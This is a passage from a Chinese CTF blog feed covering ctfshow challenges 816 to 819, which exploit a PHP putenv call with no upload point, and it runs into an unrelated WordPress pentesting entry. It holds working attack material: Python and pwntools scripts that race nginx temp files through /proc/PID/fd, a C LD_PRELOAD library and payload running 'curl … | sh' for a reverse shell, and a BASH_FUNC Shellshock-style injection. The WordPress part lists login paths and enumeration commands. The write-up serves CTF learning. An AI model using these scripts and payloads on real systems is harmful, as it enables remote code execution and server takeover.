sodata&#125;requests.post(url+&quot;?a&#x3D;write&quot;, data&#x3D;data)requests.get(url+&quot;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;construct.so&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/images/so/conclusion.png" class="lazyload placeholder" data-srcset="/images/so/conclusion.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="无上传点利用方式"><a href="#无上传点利用方式" class="headerlink" title="无上传点利用方式"></a>无上传点利用方式</h3><h4 id="思路一-想办法上传文件"><a href="#思路一-想办法上传文件" class="headerlink" title="思路一 想办法上传文件"></a>思路一 想办法上传文件</h4><h5 id="强制上传文件漏洞代码"><a href="#强制上传文件漏洞代码" class="headerlink" title="强制上传文件漏洞代码"></a>强制上传文件漏洞代码</h5><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]);    system(&quot;echo ctfshow&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="文件上传的核心"><a href="#文件上传的核心" class="headerlink" title="文件上传的核心"></a>文件上传的核心</h5><p>文件上传的本质就是数据交换，就是将客户端的数据发送到服务端，服务端对客户端提交的数据进行持久化的过程。所以，即使当前网站可能没有明确的文件上传点，但是，如果仍进行了数据的交互，有数据交互就会有数据的处理，因此就可能会有数据的持久化，所以可以以此来加以利用。</p><h5 id="数据交互点"><a href="#数据交互点" class="headerlink" title="数据交互点"></a>数据交互点</h5><p>根据以上思路，我们可以分析出，一个简单的php环境下面的web题目，可能会存在以下数据交互点：</p><p>1、协议层数据交互，tcp三次握手。</p><p>2、应用层数据交互：</p><p>a、客户端的http包发送给服务端的http监听端口</p><p>b、服务端的http服务器将包转发给php解释器（PHP-FPM&#x2F;Apache Handler）</p><p>很明显在协议层传输室，数据包还没有解包，所以不会进行持久化操作，排除。  </p><p>在应用层传输时，会做一些临时文件的保存，有两类：  </p><p>1、超过nginx最小的数据处理单元后，数据并没有接收完毕，只能先进行保存，等待数据接收完毕之后在转发出去，在接收数据的这段时间，会有短暂的数据保存。</p><p>2、php处理超全局变量$_FILES时，上传的临时文件都是被强制先保存到临时目录，待脚本执行完毕后再删除，这里也有短暂的数据保存。</p><h4 id="姿势一-强制上传脚本（web入门-816）"><a href="#姿势一-强制上传脚本（web入门-816）" class="headerlink" title="姿势一 强制上传脚本（web入门-816）"></a>姿势一 强制上传脚本（web入门-816）</h4><p>可以强制上传临时文件到&#x2F;tmp目录下，所以利用前面构造的恶意so文件，写个Python脚本跑两次就行了。</p><p>交互代码如下：</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;48550287-fe2b-4e3b-86ad-024fe1e0e8cb.challenge.ctf.show&#x2F;?env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;&quot;files &#x3D; &#123;&#39;file&#39;: open(&#39;construct.so&#39;, &#39;rb&#39;).read()&#125;requests.post(url, files&#x3D;files)requests.post(url, files&#x3D;files)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="姿势二-利用nginx的body缓存机制配合linux特性proc（web入门-817）"><a href="#姿势二-利用nginx的body缓存机制配合linux特性proc（web入门-817）" class="headerlink" title="姿势二 利用nginx的body缓存机制配合linux特性proc（web入门-817）"></a>姿势二 利用nginx的body缓存机制配合linux特性proc（web入门-817）</h4><h5 id="什么是nginx的body缓存机制"><a href="#什么是nginx的body缓存机制" class="headerlink" title="什么是nginx的body缓存机制"></a>什么是nginx的body缓存机制</h5><p>文档：<a href="http://tengine.taobao.org/nginx_docs/cn/docs/http/ngx_http_core_module.html">http://tengine.taobao.org/nginx_docs/cn/docs/http/ngx_http_core_module.html</a>  </p><h5 id="1、client-body-buffer-size"><a href="#1、client-body-buffer-size" class="headerlink" title="1、client_body_buffer_size"></a>1、client_body_buffer_size</h5><pre class="line-numbers language-none"><code class="language-none">client_body_buffer_size语法: client_body_buffer_size size;默认值: client_body_buffer_size 8k|16k;上下文: http, server, location这里设置读取客户端请求正文的缓冲容量。如果请求正文大于缓冲容量，整个正文或者正文的一部分将写入临时文件。 缓冲大小默认等于两块内存页的大小，在x86平台、其他32位平台和x86-64平台，这个值是8K。在其他64位平台，这个值一般是16K。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上面的文档看来可以知道当请求正文一次性超过16k或者8k，就会写入一个临时文件，这个很重要。  </p><p>这里写入了一个临时文件，如果能把我们恶意构造的so文件写进去，且知道存储的路径，那么就能通过putenv，设置LD_PRELOAD环境变量就能够执行任意代码了。</p><h5 id="2、client-body-in-file-only"><a href="#2、client-body-in-file-only" class="headerlink" title="2、client_body_in_file_only"></a>2、client_body_in_file_only</h5><pre class="line-numbers language-none"><code class="language-none">语法: client_body_in_file_only on | clean | off;默认值: client_body_in_file_only off;上下文: http, server, location决定nginx是否将客户端请求正文整个写入文件。这条指令在调试时，或者使用$request_body_file变量时， 或者使用ngx_http_perl_module模块的 $r-&gt;request_body_file方法时都可以使用。当指令值设置为on时，请求处理结束后不会删除临时文件。当指令值设置为clean时，请求处理结束后会删除临时文件。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3、client-body-temp-path"><a href="#3、client-body-temp-path" class="headerlink" title="3、client_body_temp_path"></a>3、client_body_temp_path</h5><pre class="line-numbers language-none"><code class="language-none">语法: client_body_temp_path path [level1 [level2[level3]]];默认值: client_body_temp_path client_body_temp;上下文: http, server, location<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>定义存储客户端请求正文的临时文件的目录。 支持在指定目录下多达3层的子目录结构。比如下面配置</p><blockquote><pre class="line-numbers language-none"><code class="language-none">client_body_temp_path &#x2F;spool&#x2F;nginx&#x2F;client_temp 1 2;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>  存储临时文件的路径是</p><blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;spool&#x2F;nginx&#x2F;client_temp&#x2F;7&#x2F;45&#x2F;00000123457<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>重点关注默认存放位置，是按照顺序存放的，默认的规则如下：  </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="4、client-max-body-size"><a href="#4、client-max-body-size" class="headerlink" title="4、client_max_body_size"></a>4、client_max_body_size</h5><pre class="line-numbers language-none"><code class="language-none">语法: client_max_body_size size;默认值: client_max_body_size 1m;上下文: http, server, location设置允许客户端请求正文的最大长度。请求的长度由“Content-Length”请求头指定。 如果请求的长度超过设定值，nginx将返回错误413 (Request Entity Too Large)到客户端。 请注意浏览器不能正确显示这个错误。 将size设置成0可以使nginx不检查客户端请求正文的长度。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>构造一个恶意so文件，首先是需要小于16k，然后手工添加一些无关字节到恶意so文件中，手工膨胀到16k以上，那么这样就有可能将我们的恶意so文件通过缓存机制暂时保存在服务器中。  </p><p>但是，也有一个新的问题，在nginx读取完毕之后，转发个php-fpm就删除掉了，也就是在php解释之前就删除了。  </p><p>本地测试：</p><p>这里可以利用strace来监控流程：  </p><pre class="line-numbers language-none"><code class="language-none">trace -f -t -e trace&#x3D;file nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用pwntools写代码来发包：  </p><pre class="line-numbers language-none"><code class="language-none">from pwn import *import timehost&#x3D;&#39;127.0.0.1&#39;port&#x3D;80url&#x3D;remote(host,port)def getso():with open(&quot;hack.so&quot;,&quot;rb&quot;) as f:ret&#x3D;f.read()return retpayload&#x3D;getso()+b&#39;\n&#39;*30*1024send&#x3D;&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1\rHost:&#123;host&#125;\rContent-Length:&#123;length&#125;\r\r&#123;data&#125;&#39;&#39;&#39;.format(host&#x3D;host.length&#x3D;len(payload),data&#x3D;payload)url.send(send)time.sleep(10)url.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样子本地测试可以知道nginx的确会生成缓存文件，并且在十秒钟断开连接后就会使用unlink把它删除。</p><p>所以我们此时并不能够直接LD_PRELOAD&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;0000000001来访问这个缓存文件，因为到php解释执行时，unlink早已被执行，文件已经不存在了。  </p><p>但是通过监控发现，直接生成之后，会被马上删除掉，但是删除掉之后居然能够继续修改和访问？如图所示：  </p><p><img src="/images/so/delete-modify.png" class="lazyload placeholder" data-srcset="/images/so/delete-modify.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>因此我们思考是否可以利用linux的特性来使用<code>/proc/PID/fd/&#123;1&#125;</code>这种文件！  </p><p>答案是可以但是有一定限制条件：  </p><p>必须使用相同用户名执行php和nginx才可以，默认php执行用户名为www-data，而nginx的&#x2F;proc&#x2F;PID&#x2F;fd目录的所有者为nginx的执行用户，默认为nginx，如果两个用户权限不同的情况下是不能直接访问的。  </p><h5 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h5><p>关于proc：<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc 是一个伪文件系统, 被用作内核数据结构的接口, 而不仅仅是解释说明&#x2F;dev&#x2F;kmem.&#x2F;proc 里的大多数文件都是只读的, 但也可以通过写一些文件来改变内核变量.(Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。 Sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。)&#x2F;proc&#x2F;pid&#x2F;fd&#x2F; 这个目录包含了进程打开的每一个文件的链接；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h5><pre class="line-numbers language-none"><code class="language-none">$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\&#x2F;(\w+\&#x2F;?)+$&#x2F;&quot;, $file))&#123;shell_exec(shell_exec(&quot;cat $file&quot;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="joker大师傅写的全自动反弹shell脚本"><a href="#joker大师傅写的全自动反弹shell脚本" class="headerlink" title="joker大师傅写的全自动反弹shell脚本"></a>joker大师傅写的全自动反弹shell脚本</h5><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-04-28 22:35:19# @Last Modified by:   h1xa# @Last Modified time: 2022-04-29 00:23:30# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comfrom pwn import *import timeimport threadinghost &#x3D; &quot;pwn.challenge.ctf.show&quot;port &#x3D; 28166#反弹shell地址和端口your_shell&#x3D;&#39;https:&#x2F;&#x2F;your-shell.com&#x2F;IP地址:端口&#39;#context.log_level &#x3D; &#39;debug&#39;def writeBuff():url &#x3D; remote(host,port)payload &#x3D; &#39;curl &#39;+your_shell+&#39; |sh &amp;&amp; echo &#39;+&#39;A&#39;*16*1024send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\rContent-Length:&#123;length&#125;\r\r&#123;data&#125;&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,length&#x3D;len(payload)*2,data&#x3D;payload)url.send(send)time.sleep(60)url.close()log.success(&quot;writeBuff done&quot;)exit()def readBuff(pid,fd):url &#x3D; remote(host,port)send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\r\r&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,fd&#x3D;fd,pid&#x3D;pid)url.send(send)url.close()def forceBuff(pid):for j in range(10,15):log.info(f&quot;readBuff(&#123;pid&#125;,&#123;j&#125;)&quot;)readBuff(pid,j)def run():wb &#x3D; threading.Thread(target&#x3D;writeBuff)wb.start()time.sleep(3)log.progress(&quot;writeBuff thread starting...&quot;)forceBuff(117)log.progress(f&quot;readBuff thread starting...&quot;)log.success(&quot;execute done&quot;)exit()def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="姿势三-利用nginx的fastcgi的临时文件"><a href="#姿势三-利用nginx的fastcgi的临时文件" class="headerlink" title="姿势三 利用nginx的fastcgi的临时文件"></a>姿势三 利用nginx的fastcgi的临时文件</h4><p>和姿势二大同小异，区别就是<strong>反向缓存</strong>。即当php-fpm返回处理后的较大数据时，超过nginx的缓冲区大小的时候，就会保存文件。  </p><p>joker师傅说条件利用苛刻，所以没讲。</p><h4 id="姿势四-利用nginx的body缓存配合LD-PRELOAD执行恶意so文件（web入门-818）"><a href="#姿势四-利用nginx的body缓存配合LD-PRELOAD执行恶意so文件（web入门-818）" class="headerlink" title="姿势四 利用nginx的body缓存配合LD_PRELOAD执行恶意so文件（web入门-818）"></a>姿势四 利用nginx的body缓存配合LD_PRELOAD执行恶意so文件（web入门-818）</h4><h5 id="题目漏洞源码"><a href="#题目漏洞源码" class="headerlink" title="题目漏洞源码"></a>题目漏洞源码</h5><pre class="line-numbers language-none"><code class="language-none">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;putenv($env);system(&quot;echo ctfshow&quot;);&#125;else&#123;system(&quot;ps aux&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里跟上面那题大同小异，上面的题目是直接缓存了我们的shell，而这题我们需要直接缓存一个恶意的so文件。  </p><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>恶意的so文件使用上面做过的题目生成的就行了，也可以用下面的c文件生成</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;__attribute__ ((__constructor__)) void preload(void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-04-27 12:43:50# @Last Modified by:   h1xa# @Last Modified time: 2022-04-29 12:03:02# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comfrom pwn import *import timeimport threadingimport requestshost &#x3D; &quot;pwn.challenge.ctf.show&quot;port &#x3D; 28120context.log_level &#x3D; &#39;debug&#39;def getSo():with open(&quot;exp.so&quot;,&quot;rb&quot;) as f:ret &#x3D; f.read()return retdef writeBuff():url &#x3D; remote(host,port)payload &#x3D; getSo()send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\rContent-Length:&#123;length&#125;\r\r&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,length&#x3D;len(payload)*2)url.send(send)url.send(payload)time.sleep(60)url.close()log.success(&quot;writeBuff done&quot;)exit()def readBuff(pid,fd):url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;index.php?env&#x3D;LD_PRELOAD&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125;&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,fd&#x3D;fd,pid&#x3D;pid)requests.get(url)def forceBuff(pid):for j in range(10,15):log.info(f&quot;readBuff(&#123;pid&#125;,&#123;j&#125;)&quot;)readBuff(pid,j)time.sleep(1)def run():wb &#x3D; threading.Thread(target&#x3D;writeBuff)wb.start()time.sleep(3)log.progress(&quot;writeBuff thread starting...&quot;)forceBuff(117)log.progress(f&quot;readBuff thread starting...&quot;)log.success(&quot;execute done&quot;)exit()def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>群主的脚本似乎跑不出来818，这里借用yu师傅的脚本，tql！</p><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8import urllib.parseimport  threading, requestsimport socketimport report&#x3D; 28166s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1Host:127.0.0.1&#39;&#39;&#39;.encode())data&#x3D;s.recv(1024).decode()s.close()pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()print(pid)l&#x3D;str(len(open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200)).encode()def upload():while True:s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))x&#x3D;b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1User-Agent: yu22xContent-Length: &#39;&#39;&#39;+l+b&#39;&#39;&#39;Content-Type: application&#x2F;x-www-form-urlencodedConnection: close&#39;&#39;&#39;+open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200+b&#39;&#39;&#39;&#39;&#39;&#39;s.send(x)s.close()def bruter():while True:for fd in range(10,16):print(fd)s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F;?env&#x3D;LD_PRELOAD&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1Host: 127.0.0.1User-Agent: yu22xConnection: close&#39;&#39;&#39;.encode())print(s.recv(2048).decode())s.close()for i in range(30):    t &#x3D; threading.Thread(target&#x3D;upload)    t.start()for j in range(30):    a &#x3D; threading.Thread(target&#x3D;bruter)    a.start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路二-想办法利用环境变量（web入门-819）"><a href="#思路二-想办法利用环境变量（web入门-819）" class="headerlink" title="思路二 想办法利用环境变量（web入门-819）"></a>思路二 想办法利用环境变量（web入门-819）</h4><h5 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h5><pre class="line-numbers language-none"><code class="language-none">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env);    system(&quot;whoami&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面的题使用的是pwn的模式，转发端口，这题是一个正常的页面，会经过层层的流量转发，所以不能进行一个临时文件的写入了，所以得另外考虑新的方式。所以这里从putenv这里开始突破。  </p><h5 id="php的system函数"><a href="#php的system函数" class="headerlink" title="php的system函数"></a>php的system函数</h5><p>跟进php的system的底层c代码可以知道，php首先调用了VCWD_POPEN方法，又定义了宏。这里是调用了glibc的popen函数，跟进glibc的源代码，可以看到popen是如何实现的，看到了执行了sh -c命令，在centos下，由于sh指向bash，所以就是执行了bash -c命令。</p><h5 id="bash与环境变量"><a href="#bash与环境变量" class="headerlink" title="bash与环境变量"></a>bash与环境变量</h5><p>那么就思考能否控制bash所引用的环境变量，从而实现代码执行。bash在设计时，有这么一个功能，就是可以通过环境变量来初始化一个匿名函数，并给他命名。如下所示：</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;funccontent&#x3D;() &#123;:;&#125;那么合起来为func&#x3D;() &#123;:;&#125;我们再把该函数注册进去，怎么注册呢，这里利用的是类似php的eval函数。类似于：eval(func&#x3D;() &#123;:;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="破壳漏洞"><a href="#破壳漏洞" class="headerlink" title="破壳漏洞"></a>破壳漏洞</h5><pre class="line-numbers language-none"><code class="language-none">name&#x3D;funccontent&#x3D;hack&#x3D;() &#123;:;&#125;;id所以合起来就变为：eval(func&#x3D;hack&#x3D;() &#123;:;&#125;;id)通过一个分号，前面的函数定义完毕之后，随即就执行了后面的id方法。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方修复：</p><pre class="line-numbers language-none"><code class="language-none">规定：函数名必须有前缀函数体必须有前缀只执行前缀以后，后缀之前的内容函数体必须以()&#123;开头，函数名BASH_FUNC_开头，并且以%%结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="再看题目"><a href="#再看题目" class="headerlink" title="再看题目"></a>再看题目</h5><p>有破壳漏洞的思路进行思考，我们可以通过这个putenv，在通过设置环境变量的时候注册一个函数，通过移花接木将whoami命令覆盖为bash命令来执行。  </p><p>所以开始根据官方的规定进行合理的构造：</p><pre class="line-numbers language-none"><code class="language-none">BASH_FUNC_whoami%%&#x3D;() &#123; id; &#125;?env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; id; &#125;传给env，直接执行成功！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：</p><pre class="line-numbers language-none"><code class="language-none">如果ubuntu的sh指向dsh，alpine的sh指向ash，那么上面的姿势是无法利用的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="无上传点总结"><a href="#无上传点总结" class="headerlink" title="无上传点总结"></a>无上传点总结</h3><p>能够控制环境变量，但是无文件上传点，可以利用的多种姿势如下：  </p><p>1、利用php的$_FILES机制，使用临时文件注入恶意的so文件。  </p><p>2、利用nginx的body缓存机制，一是直接传shell，另外一个是传恶意so。  </p><p>3、利用nginx的fastcgi缓存。（joker师傅没讲  </p><p>4、利用bash的环境变量注册匿名函数。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress分析</title>
      <link href="/2022/04/24/wordpress-fen-xi/"/>
      <url>/2022/04/24/wordpress-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>wordpress学习信息主要来自<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information">HackTricks</a></p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>Themes files can be found in<code>/wp-content/themes/</code></p><p>For example: Using <strong>theme twentytwelve</strong> you can <strong>access</strong> the <strong>404.php</strong> file in**:** <strong>&#x2F;wp-content&#x2F;themes&#x2F;twentytwelve&#x2F;404.php</strong></p><p>Another useful url could be: <strong>&#x2F;wp-content&#x2F;themes&#x2F;default&#x2F;404.php</strong></p><p>In <strong>wp-config.php</strong> you can find the root password of the database.</p><p>Default login paths to check: *** &#x2F;wp-login.php, &#x2F;wp-login&#x2F;, &#x2F;wp-admin&#x2F;, &#x2F;wp-admin.php, &#x2F;login&#x2F;\ ***</p><h3 id="主要文件"><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3><p><code>index.php,license.txt</code></p><p><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</p><pre class="line-numbers language-none"><code class="language-none">Login folders:&#x2F;wp-admin&#x2F;login.php&#x2F;wp-admin&#x2F;wp-login.php&#x2F;login.php&#x2F;wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>xmlrpc.php</code>（一个文件，使用HTTP相应码知识API错误）</p><p>is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a>.</p><p>The <code>wp-content</code> folder is the main directory where plugins and themes are stored.</p><p><code>wp-content/uploads/</code> Is the directory where any files uploaded to the platform are stored.</p><p><code>wp-includes/</code> This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p><p>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</p><h3 id="Passive-enumeration"><a href="#Passive-enumeration" class="headerlink" title="Passive enumeration"></a>Passive enumeration</h3><pre class="line-numbers language-none"><code class="language-none">Get Pluginscurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;plugins&#x2F;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Get Themescurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;themes&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Extract versions in generalcurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep http | grep -E &#39;?ver&#x3D;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Active-enumeration"><a href="#Active-enumeration" 